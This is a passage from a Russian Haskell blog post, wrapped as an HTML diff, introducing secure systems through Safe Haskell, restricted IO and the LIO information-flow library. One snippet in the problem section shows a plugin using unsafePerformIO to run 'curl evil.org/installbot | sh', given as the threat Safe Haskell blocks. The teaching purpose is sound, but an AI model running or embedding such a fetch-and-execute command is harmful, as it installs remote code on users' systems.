@@ -1,0 +1,977 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <title>
+            Ограниченное IO  и защищенные системы (введение)
+        </title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content>
+        <meta name="author" content>
+        <link rel="icon" type="image/png" href="../../../../../static/images/favicon.ico">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
+            
+        </script>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/css/bootstrap.min.css">
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/js/bootstrap.min.js">
+            
+        </script>
+        <script type="text/x-mathjax-config">
+                    MathJax.Hub.Config({
+            extensions: ["tex2jax.js"],
+            jax: ["input/TeX", "output/HTML-CSS"],
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
+                processEscapes: true,
+            },
+            "HTML-CSS": { availableFonts: ["TeX"] },
+            TeX: {
+                extensions: ["AMScd.js", "enclose.js"],
+            },
+        });
+        
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+            
+        </script>
+        <style>
+            
+@import url(https://fonts.googleapis.com/css?family=Roboto+Condensed:400,400i,700|Roboto+Mono:400,400i,700&subset=cyrillic);
+body
+{
+  font-family      : "Roboto Condensed", sans-serif;
+  font-size        : 18px;
+  background-color : #f6f6f6;
+  background-image : url("/static/images/satinweave.png");
+}
+
+a:hover
+{
+  color : black !important;
+}
+
+a:link
+{
+  color : black !important;
+}
+
+a:visited
+{
+  color : black !important;
+}
+
+a:active
+{
+  color : black !important;
+}
+
+.footer
+{
+  margin         : 0px auto 0px auto;
+  max-width      : 86%;
+  padding-top    : 70px;
+  padding-bottom : 50px;
+  color          : #777777;
+  font-size      : 94%;
+}
+
+.left
+{
+  text-align : left;
+}
+
+.right
+{
+  text-align : right;
+}
+
+.center
+{
+  text-align : center;
+}
+
+h1
+{
+  text-align     : center;
+  font-size      : 200%;
+  padding-top    : 30px;
+  padding-bottom : 30px;
+}
+
+h2
+{
+  font-size      : 160%;
+  padding-top    : 30px;
+  padding-bottom : 25px;
+}
+
+h3
+{
+  font-size      : 140%;
+  padding-top    : 25px;
+  padding-bottom : 20px;
+}
+
+a
+{
+  color           : #2d3644;
+  text-decoration : none;
+  border-bottom   : 1px dotted #333333;
+}
+
+a:hover
+{
+  color           : #5493ff;
+  text-decoration : none;
+  border-bottom   : 1px solid #999999;
+}
+
+a:visited
+{
+  color           : #2d3644;
+  text-decoration : none;
+  border-bottom   : 1px dotted #333333;
+}
+
+a:active
+{
+  color           : #2d3644;
+  text-decoration : none;
+  border-bottom   : 1px dotted #333333;
+}
+
+.href-to-original
+{
+  text-align  : right;
+  font-size   : 90%;
+  padding-top : 10px;
+}
+
+#authors-link
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#about-link
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#tags-link
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#categories-link
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#links-link
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#sl-1
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#sl-2
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#sl-3
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#sl-4
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#sl-5
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#go-home
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#hakyll-link
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+#mit-link
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+.fpconf-link
+{
+  font-size : 120%;
+}
+
+.fby-link
+{
+  font-size : 120%;
+}
+
+.friends-separator
+{
+  padding-left : 30px;
+}
+
+.navigation
+{
+  max-width      : 86%;
+  margin         : 0px auto 0px auto;
+  padding-top    : 40px;
+  padding-bottom : 40px;
+  font-size      : 120%;
+}
+
+.links
+{
+  margin-top     : 17px;
+  font-size      : 90%;
+  padding-bottom : 10px;
+}
+
+.logo-area
+{
+  text-align : center;
+}
+
+.social-links
+{
+  text-align : right;
+  margin-top : 10px;
+  font-size  : 140%;
+}
+
+.social-links-separator
+{
+  padding-right : 20px;
+}
+
+.links-separator
+{
+  padding-right : 20px;
+}
+
+.reddit-color
+{
+  color : #ff4500;
+}
+
+.twitter-color
+{
+  color : #1da1f2;
+}
+
+.gitter-color
+{
+  color : #e10454;
+}
+
+.github-color
+{
+  color : #000000;
+}
+
+.rss-color
+{
+  color : #ff924a;
+}
+
+.name-of-category
+{
+  font-size        : 85%;
+  border           : 1px solid #ffbcb1;
+  border-radius    : 3px 3px 3px 3px;
+  background-color : #fec1b7;
+  padding-top      : 3px;
+  padding-bottom   : 3px;
+  padding-left     : 5px;
+  padding-right    : 5px;
+  margin-right     : 22px;
+}
+
+.post-info
+{
+  color          : #777777;
+  font-size      : 90%;
+  font-family    : "Roboto Mono", monospace;
+  text-align     : left;
+  padding-top    : 10px;
+  padding-bottom : 60px;
+}
+
+.post-list
+{
+  padding         : 0px 0px 0px 0px;
+  margin          : 0px 0px 0px 0px;
+  list-style-type : none;
+  font-size       : 110%;
+}
+
+
+.post-list li
+{
+  margin-top     : 21px;
+  padding-bottom : 21px;
+}
+
+
+.post-list a
+{
+  text-decoration : none;
+}
+
+
+.post-list a:hover
+{
+  text-decoration : none;
+}
+
+.post-comments
+{
+  padding-left  : 15px;
+  padding-right : 5px;
+  font-size     : 90%;
+  color         : #777777;
+}
+
+.comments-link
+{
+  font-size : 90%;
+  color     : #777777;
+}
+
+.post-date
+{
+  text-align : right;
+  color      : #888888;
+}
+
+.archive-button
+{
+  padding-top : 26px;
+}
+
+.undecorated
+{
+  text-decoration : none;
+  border-bottom   : 0px solid #ffffff;
+}
+
+img[src*='#center']
+{
+  margin    : 0px auto 0px auto;
+  display   : block;
+  max-width : 100%;
+}
+
+.social-buttons-separator
+{
+  padding-top : 40px;
+}
+
+.heart-color
+{
+  color : #ff3a1d;
+}
+
+.tags-cloud
+{
+  text-align     : center;
+  padding-top    : 30px;
+  padding-bottom : 30px;
+  margin         : 0px auto 0px auto;
+  max-width      : 60%;
+}
+
+.tag-default
+{
+  background-color : #fec1b7;
+  border           : 1px solid #ffbcb1;
+  color            : inherit;
+}
+
+
+.sourceCode code
+{
+  font-family : "Roboto Mono", monospace;
+}
+
+pre.sourceCode
+{
+  font-family      : "Roboto Mono", monospace;
+  font-size        : 94%;
+  border           : 1px solid #fbe7d8;
+  border-radius    : 3px 3px 3px 3px;
+  background-color : #fdf6e3;
+  color            : #073642;
+  padding-top      : 10px;
+  padding-bottom   : 10px;
+  padding-left     : 15px;
+  padding-right    : 15px;
+  margin-top       : 20px;
+  margin-bottom    : 20px;
+}
+
+
+#content p > code
+{
+  font-family      : "Roboto Mono", monospace;
+  font-size        : 94%;
+  border-radius    : 3px 3px 3px 3px;
+  border           : 1px solid #fbe7d8;
+  background-color : #fdf6e3;
+  color            : #000000;
+  padding-top      : 1px;
+  padding-bottom   : 1px;
+  padding-left     : 4px;
+  padding-right    : 4px;
+}
+
+
+pre.sourceCode span.kw
+{
+  color       : #007020;
+  font-weight : 600;
+}
+
+
+pre.sourceCode span.dt
+{
+  color : #902000;
+}
+
+
+pre.sourceCode span.dv
+{
+  color : #40a070;
+}
+
+
+pre.sourceCode span.bn
+{
+  color : #40a070;
+}
+
+
+pre.sourceCode span.fl
+{
+  color : #40a070;
+}
+
+
+pre.sourceCode span.ch
+{
+  color : #4070a0;
+}
+
+
+pre.sourceCode span.co
+{
+  color : #60a0b0;
+}
+
+
+pre.sourceCode span.ot
+{
+  color : #007020;
+}
+
+
+pre.sourceCode span.al
+{
+  color       : #fa0202;
+  font-weight : 600;
+}
+
+
+pre.sourceCode span.fu
+{
+  color : #06287e;
+}
+
+
+pre.sourceCode span.er
+{
+  color       : #fa0202;
+  font-weight : 600;
+}
+
+th, td
+{
+  border-color : #808080;
+  border-style : solid;
+  border-width : 1px;
+}
+
+:target
+{
+  background-color : #ffff00;
+}
+
+
+/* Generated with Clay, http://fvisser.nl/clay */
+        </style>
+        <script>
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-58217738-1', 'auto');
+ga('send', 'pageview');
+
+        </script>
+        <script>
+            window.___gcfg = { lang: 'ru' };
+        </script>
+        <script src="https://apis.google.com/js/platform.js">
+            
+        </script>
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://ruhaskell.org/feed.xml">
+    </head>
+    <body>
+        <div class="container-fluid">
+            <div class="navigation">
+                <div class="row">
+                    <div class="col-lg-5 col-md-5 col-sm-12 col-xs-12">
+                        <div class="links">
+                            <a href="../../../../../authors.html" id="authors-link">
+                                Авторы
+                            </a>
+                            <span class="links-separator">
+                                
+                            </span>
+                            <a href="../../../../../tags.html" id="tags-link">
+                                Темы
+                            </a>
+                            <span class="links-separator">
+                                
+                            </span>
+                            <a href="../../../../../categories.html" id="categories-link">
+                                Разделы
+                            </a>
+                            <span class="links-separator">
+                                
+                            </span>
+                            <a href="../../../../../about.html" id="about-link">
+                                О нас
+                            </a>
+                            <span class="links-separator">
+                                
+                            </span>
+                            <a href="../../../../../links.html" id="links-link">
+                                Ресурсы
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-lg-2 col-md-2 col-sm-12 col-xs-12">
+                        <div class="logo-area">
+                            <a href="../../../../../" title="Домой" id="go-home">
+                                <img src="../../../../../static/images/logo.svg" alt="ruHaskell" width="100">
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-lg-5 col-md-5 col-sm-12 col-xs-12">
+                        <div class="social-links">
+                            <a href="../../../../../links.html#discussion" id="sl-1" title="Общение">
+                                <i class="fa fa-commenting gitter-color" aria-hidden="true">
+                                    
+                                </i>
+                            </a>
+                            <span class="social-links-separator">
+                                
+                            </span>
+                            <a href="https://twitter.com/ruHaskell" id="sl-2" title="Следите за нашим Твиттером">
+                                <i class="fa fa-twitter twitter-color" aria-hidden="true">
+                                    
+                                </i>
+                            </a>
+                            <span class="social-links-separator">
+                                
+                            </span>
+                            <a href="https://github.com/ruHaskell/ruhaskell" id="sl-4" title="Мы живём на GitHub">
+                                <i class="fa fa-github github-color" aria-hidden="true">
+                                    
+                                </i>
+                            </a>
+                            <span class="social-links-separator">
+                                
+                            </span>
+                            <a href="../../../../../feed.xml" id="sl-5" title="Наш RSS">
+                                <i class="fa fa-rss rss-color" aria-hidden="true">
+                                    
+                                </i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container">
+            <div id="content">
+                <h1>
+    Ограниченное IO  и защищенные системы (введение)
+</h1>
+<div class="row">
+    <div class="col-xs-9 col-sm-8 col-md-8 col-lg-8">
+        <div class="post-info">
+            <strong>let</strong> author&nbsp;&nbsp;&nbsp;= "<a href="../../../../../authors/%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B0%D0%BD%D0%B4%D1%80%20%D0%92%D0%B5%D1%80%D1%88%D0%B8%D0%BB%D0%BE%D0%B2.html">Александр Вершилов</a>"<br />
+&nbsp;&nbsp;&nbsp;&nbsp;date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= fromGregorian 2015 feb 15<br />
+&nbsp;&nbsp;&nbsp;&nbsp;category = "<a href="../../../../../categories/theory.html">Теория</a>"<br />
+&nbsp;&nbsp;&nbsp;&nbsp;tags&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= [&quot;<a href="../../../../../tags/%D0%BF%D0%B0%D0%BA%D0%B5%D1%82%D1%8B.html">пакеты</a>&quot;, &quot;<a href="../../../../../tags/%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C.html">безопасность</a>&quot;]
+
+        </div>
+    </div>
+    <div class="col-xs-3 col-sm-4 col-md-4 col-lg-4">
+        
+
+    </div>
+</div>
+
+
+<div>
+    <p>В данном посте пойдет речь про возможности для создания защищенных систем и
+введение во фреймворк, позволяющий писать такие программы.
+В дальнейшем, если будет интерес к данным вопросам, планируется углубление
+в данную тему.</p>
+<h2 id="формулировка-проблемы">Формулировка проблемы</h2>
+<p>Под защищенной системой предполагается система, состоящая из одного или
+более узлов, устойчивая к запуску недоверенного кода,
+который лишается возможности нарушить инварианты системы.</p>
+<p>Где это может применяться? Простым примером может служить веб-сайт, на
+котором нужно запускать плагины от третьих лиц. В этом случае желательно,
+чтобы плагины не могли нарушить работу системы, получить привилегированный
+доступ или получить доступ к данным в приложении, которые не должны быть
+доступны плагину.</p>
+<p>Более сложным примером может служить система с повышенными требованиями
+к безопасности, где для каждого блока данных существует определенный набор правил.
+Правила регламентируют кто и какие операции с ними может совершать, и желательно, чтобы весь
+написанный код автоматически гарантировал сохранность этих инвариантов.
+Это позволит при анализе кода проверять только сами правила,
+а не весь исходный код.</p>
+<h3 id="безопасность-за-счет-типов">Безопасность за счет типов</h3>
+<p>Рассмотрим простейшие примеры того, как можно добиться безопасности. Поскольку
+Haskell является безопасным языком и все возможные эффекты выражены в типах
+функций, то можно предположить, что функции без нежелательных эффектов
+являются безопасными.</p>
+<p>Будем рассматривать первый пример - сайт, на который мы хотим добавить
+сервис переводов. Пусть плагин предоставляет следующую функцию:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ot">toRussian ::</span> <span class="dt">ByteString</span> <span class="ot">-&gt;</span> <span class="dt">ByteString</span></span></code></pre></div>
+<p>Исходя из типов, данному коду можно доверять, поскольку он не содержит
+эффектов, и в худшем случае текст страницы будет сломан. Какие с ним могут
+быть проблемы:</p>
+<ol type="1">
+<li><p>Код может быть плохо написан и потреблять много ресурсов (выходит за
+рамки данной статьи).</p></li>
+<li><p>Выполнение кода может не завершаться:</p>
+<pre><code>toJerkish :: ByteString -&gt; ByteString
+toJerkish xs 
+  | 'a' &lt;- B.head xs = toRussian xs    -- KABOOM!
+  | otherwise        = saneStuff</code></pre>
+<p>Естественно, это печальное поведение, но, опять же не приводит к
+нарушению гарантий безопасности и мы его не рассматриваем.</p></li>
+<li><p>Но возможен и такой случай:</p>
+<pre><code> toJerkish :: ByteString -&gt; ByteString
+ toJerkish = unsafePerformIO $ do
+     system &quot;curl evil.org/installbot | sh&quot;
+     return &quot;ЙА пАиМел тИбЯ&quot;</code></pre>
+<p>Данный код, ествественно, приводит к проблемам в безопасности и его
+бы хотелось исключить.</p></li>
+</ol>
+<p>Для третьего случая есть решение - использование расширения Safe Haskell.</p>
+<h4 id="safe-haskell">Safe Haskell</h4>
+<p>Начиная с ghc версии 7.2 haskell предоставляет расширение <a href="https://ghc.haskell.org/trac/ghc/wiki/SafeHaskell">Safe Haskell</a>,
+включающееся опцией <code>-XSafe</code>. Это расширение не позволяет включать в код
+небезопасные модули, например <code>System.IO.Unsafe</code>, таким образом использование
+<code>unsafePerformIO</code> и других подобных функций будет невозможно.</p>
+<p>В дополнение, расширение позволяет использовать безопасные импорты, т.е.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> safe <span class="dt">Evil.Code</span></span></code></pre></div>
+<p>В этом случае подключаемый модуль будет проверен на безопасность (т.е. то,
+что он не использует небезопасные модули).</p>
+<p>Однако, возникает вопрос, как же можно использовать модуль, работающий с типом
+<code>ByteString</code>, если для его реализации используются небезопасные функции?</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span><span class="ot"> ::</span> <span class="co">{- Lazy -}</span> <span class="dt">ByteString</span> <span class="ot">-&gt;</span> <span class="dt">Word8</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="dt">Empty</span>       <span class="ot">=</span> errorEmptyList <span class="st">&quot;head&quot;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> (<span class="dt">Chunk</span> c _) <span class="ot">=</span> S.unsafeHead c</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ot">unsafeHead ::</span> <span class="co">{- Strict -}</span> <span class="dt">ByteString</span> <span class="ot">-&gt;</span> <span class="dt">Word8</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>unsafeHead (<span class="dt">PS</span> x s l) <span class="ot">=</span> assert (l <span class="op">&gt;</span> <span class="dv">0</span>) <span class="op">$</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    inlinePerformIO <span class="op">$</span> withForeignPtr x <span class="op">$</span> \p <span class="ot">-&gt;</span> peekByteOff p s</span></code></pre></div>
+<p>Рассмотрим, как в <code>Haskell</code> решается эта проблема. Модули, помеченные как
+безопасные, могут использовать, в свою очередь, только безопасные модули.
+Существует два типа безопасных модулей:</p>
+<ul>
+<li>те, безопасность которых доказана компилятором <code>-XSafe</code>;</li>
+<li>помеченные автором, как безопасные (<code>-XTrustworthy</code>).</li>
+</ul>
+<p>Таким образом, такие модули как <code>Data.ByteString</code> могут быть собраны с флагом <code>-XTrustworthy</code>.
+Обычно для решения таких вопросов все небезопасные функции помещают в отдельный модуль,
+например <code>Data.ByteString.Unsafe</code>. Таким образом, доказывается, что функции, экспортируемые
+<code>Data.ByteString</code>, не могут быть использованы небезопасным образом, даже в том случае, когда
+внутренние модули используют небезопасные функции.</p>
+<p>Естественно, существуют механизмы управления доверием автору модуля, при помощи
+которых можно указать доверять ли флагу <code>-XTrustworthy</code>. Флаг <code>-trust Pkg</code>, <code>-distruct Pkg</code>,
+<code>-distrust-all-packages</code>.</p>
+<h3 id="использование-ограниченного-io">Использование ограниченного IO</h3>
+<p>Проблема с чистыми функциями может считаться отчасти решенной, но что, если
+для работы функции действительно необходимы <code>IO</code> эффекты? Например, сервис
+переводит реальный язык и должен общаться с сервером словаря?</p>
+<p>Решение данной проблемы заключается в использовании ограниченного <code>IO</code> (<code>RIO</code>)
+небезопасный код реализует функцию ввода-вывода:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ot">googleTranslate ::</span> <span class="dt">Language</span> <span class="ot">-&gt;</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">RIO</span> <span class="dt">L.ByteString</span></span></code></pre></div>
+<p>Но использует монаду <code>RIO</code>. Таким образом, доверенный модуль реализует
+функции <code>RIO</code> для доступа к сети, проверяет параметры и отклоняет опасные операции.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ot">{-# LANGUAGE Trustworthy #-}</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="kw">module</span> <span class="dt">RIO</span> (<span class="dt">RIO</span>(), runRIO, RIO.readFile) <span class="kw">where</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="co">-- Notice that symbol UnsafeRIO is not exported from this module!</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="kw">newtype</span> <span class="dt">RIO</span> a <span class="ot">=</span> <span class="dt">UnsafeRIO</span> (<span class="dt">IO</span> a) <span class="co">-- constructor is not exported !</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ot">runRIO ::</span> <span class="dt">RIO</span> a <span class="ot">-&gt;</span> <span class="dt">IO</span> a</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>runRIO (<span class="dt">UnsafeRIO</span> io) <span class="ot">=</span> io</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="kw">instance</span> <span class="dt">Monad</span> <span class="dt">RIO</span> <span class="kw">where</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>    <span class="fu">return</span> <span class="ot">=</span> <span class="dt">UnsafeRIO</span> <span class="op">.</span> <span class="fu">return</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    m <span class="op">&gt;&gt;=</span> k <span class="ot">=</span> <span class="dt">UnsafeRIO</span> <span class="op">$</span> runRIO m <span class="op">&gt;&gt;=</span> runRIO <span class="op">.</span> k</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="co">-- Returns True iff access is allowed to file name</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="ot">pathOK ::</span> <span class="dt">FilePath</span> <span class="ot">-&gt;</span> <span class="dt">IO</span> <span class="dt">Bool</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>pathOK file <span class="ot">=</span> <span class="co">{- Implement some policy based on file name -}</span></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="fu">readFile</span><span class="ot"> ::</span> <span class="dt">FilePath</span> <span class="ot">-&gt;</span> <span class="dt">RIO</span> <span class="dt">String</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="fu">readFile</span> file <span class="ot">=</span> <span class="dt">UnsafeRIO</span> <span class="op">$</span> <span class="kw">do</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>  ok <span class="ot">&lt;-</span> pathOK file</span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>  <span class="kw">if</span> ok <span class="kw">then</span> Prelude.readFile file <span class="kw">else</span> <span class="fu">return</span> <span class="st">&quot;&quot;</span></span></code></pre></div>
+<p>Примеры политик для <code>RIO</code>:</p>
+<ul>
+<li>доступ к файловой системе предоставляется только в песочнице (защита файловой системы)</li>
+<li>запрет на запуск других программ (поскольку они могут не иметь ограничений <code>RIO</code>)</li>
+<li>разрешать коннекты только к 80 порту известных серверов (защита от рассылки спама и атак на внешние сервисы)</li>
+<li>запрет на доступ к устройствам (микрофону, камере, колонкам, …)</li>
+<li>политики схожие с политиками для Java в браузере</li>
+</ul>
+<p>Но все же решение с <code>RIO</code> не достаточно, если мы вспомним все варианты использования,
+которые мы хотим решить.</p>
+<ul>
+<li>что если web-сайт содержит приватные данные, например, письма?</li>
+<li>атакующий может сохранить письма в песочнице (разрешено)</li>
+<li>когда приходит запрос на перевод специальной строки - вернуть сохраненный email (разрешено)</li>
+</ul>
+<p>Таким образом, очевидно, что для того, чтобы полноценно решить проблему безопасности,
+необходимо следить за тем, какая информация может быть опубликована, а какая нет.
+Так, например, разрешать отдавать в сеть публичные данные, и запрещать приватные.
+Для решения этой проблемы существует решение: Децентрализовнный Контроль За потоками информации
+(Decentralized Information Flow Control / DIFC)</p>
+<h3 id="тегированное-io">Тегированное IO</h3>
+<p>Команда из Стенфорда предлагает следующее решение - библиотеку LIO.
+Корни данного решения уходят в военные приложения и приложения, работающие с секретными
+данными. И заключается оно в следующем:</p>
+<ul>
+<li>каждому блоку информации приписывается тег;</li>
+<li>каждому процессу/потоку приписывается тег;</li>
+<li>все теги имеют частичный порядок по отношению ⊑ (“может переходить к” / “can flow to”)</li>
+</ul>
+<p>Пример: расмотрим процесс vim с меткой <span class="math inline">\(L_v\)</span>, и файл с меткой <span class="math inline">\(L_f\)</span> ; если файл читается,
+то система требует, чтобы выполнялось соотношение <span class="math inline">\(L_f ⊑ L_v\)</span> (файл может переходить к редактору);
+если файл записывается, то требуется, чтобы выполнялось соотношение <span class="math inline">\(L_v ⊑ L_f\)</span>; если
+файл и пишется и читается, то <span class="math inline">\(L_v ⊑ L_f ⊑ L_v\)</span>.</p>
+<p>Подобные соотношения являются тразитивными, что позволяет гораздо лучше оценивать безопасность.
+Предположим, у нас есть файл <span class="math inline">\(L_f\)</span>, при этом этот файл нельзя передавать по сети (например, приватный
+ключ), т.е. есть соотношение <span class="math inline">\(L_f ⋢ L_n\)</span> . Теперь, пусть процесс <span class="math inline">\(P\)</span> читает данный файл,
+таким образом, требуется <span class="math inline">\(L_f ⊑ L_P\)</span>. Затем, данный процесс хочет работать с сетью, что предполагает <span class="math inline">\(L_P ⊑ L_n\)</span>,
+однако, <span class="math inline">\(L_f ⊑ L_p ∧  L_p ⊑ L_n ⇒ L_f ⊑ L_n\)</span> - противоречие, т.е. <span class="math inline">\(L_P ⋢ L_N\)</span>. Следовательно,
+процесс, получивший доступ к подобному файлу, не может общаться с сетью, и наоборот, если процесс общается
+с сетью, то он не может получить доступ к файлу.</p>
+<p>Представим двух пользвателей - <span class="math inline">\(A\)</span> и <span class="math inline">\(B\)</span>. Публичную информацию обозначим тегом <span class="math inline">\(L_∅\)</span>,
+приватные данные <span class="math inline">\(A\)</span> - <span class="math inline">\(L_A\)</span>, приватные данные <span class="math inline">\(B\)</span> - <span class="math inline">\(L_B\)</span> соответсвенно.
+Что произойдёт, если смешать приватные данные <span class="math inline">\(A\)</span> и <span class="math inline">\(B\)</span> в одном документе?
+И <span class="math inline">\(A\)</span> и <span class="math inline">\(B\)</span> должны огорчатся, если такой документ будет опубликован, соотвественно
+требуется, чтобы он был, как минимум, настолько же ограничен, насколько ограничены <span class="math inline">\(L_A\)</span> и <span class="math inline">\(L_B\)</span>.
+Для этого используется нижняя граница (или lub или join) <span class="math inline">\(L_A\)</span> и <span class="math inline">\(L_B\)</span>,
+которая записывается как <span class="math inline">\(L_A ⊔ L_B\)</span>.</p>
+<pre><code>    A ⊔ B
+   /     \
+ ⊑/       \⊑ 
+ /         \
+A           B
+ \         /
+ ⊑\       /⊑ 
+   \     /
+      ∅        </code></pre>
+<p>Каждый процесс может обладать набором привилегий, используя привелению <span class="math inline">\(p\)</span>, изменяет требование
+<span class="math inline">\(L_F ⊑_p L_{proc}\)</span> на чтение и дополнительно <span class="math inline">\(L_{proc} ⊑_p L_F\)</span> на запить файла.
+Операция <span class="math inline">\(⊑_p\)</span> читается как “с учетом привигений р может переходить к” (``can flow under privileges p’’)
+и дозволяет больше, чем <span class="math inline">\(⊑\)</span>. Идея этой операции заключется в том, что
+вы можете управлять уместными привилегиями. </p>
+<p>Пример привилегий: опять рассмотрим пример с двумя пользователями,
+Очевидно, что должны выполняться условия <span class="math inline">\(A ⊑_a L_∅\)</span> и <span class="math inline">\(L_B ⊑_b L_∅\)</span>, т.е. пользователи могут
+создавать публичную или рассекречивать собственную информацию.
+Пользователи могут частично рассекречивать информацию, т.е.:
+<span class="math inline">\(L_{AB} ⊑_a L_B\)</span> и <span class="math inline">\(L_{AB} ⊑_b L_A\)</span></p>
+<p>При работе с тегированными элементами обычно производится не проверка ограничений,
+а повышение текущего тега процесса так чтобы могли быть исполнены все действия.
+Так же можно задавать максимальный уровень доверия (clearance), выше которого
+доверие процесса не может быть повышено и действия приведут к исключению.</p>
+<h5 id="пример-возможных-правил">Пример возможных правил</h5>
+<p>Введем решетку:</p>
+<pre><code>             1
+           /    \
+          /      \
+... -&gt;   B_i^j -&gt; B_j^k -&gt; ...
+       /     \   /
+      A_i     A_j  ...
+       \      /
+        \    /
+           0</code></pre>
+<p>С типами <span class="math inline">\(0\)</span>, <span class="math inline">\(A_i\)</span>, <span class="math inline">\(B_i^j\)</span>, <span class="math inline">\(1\)</span> – где:</p>
+<ul>
+<li><span class="math inline">\(0\)</span> – тег для информации, к которой никто не получал доступ,</li>
+<li><span class="math inline">\(A_i\)</span> – тег для информации, к которой получал доступ только один участник <span class="math inline">\(i\)</span>,</li>
+<li><span class="math inline">\(B_i^j\)</span> – тег для информации, доступной двум участникам (<span class="math inline">\(i\)</span> и <span class="math inline">\(j\)</span>),</li>
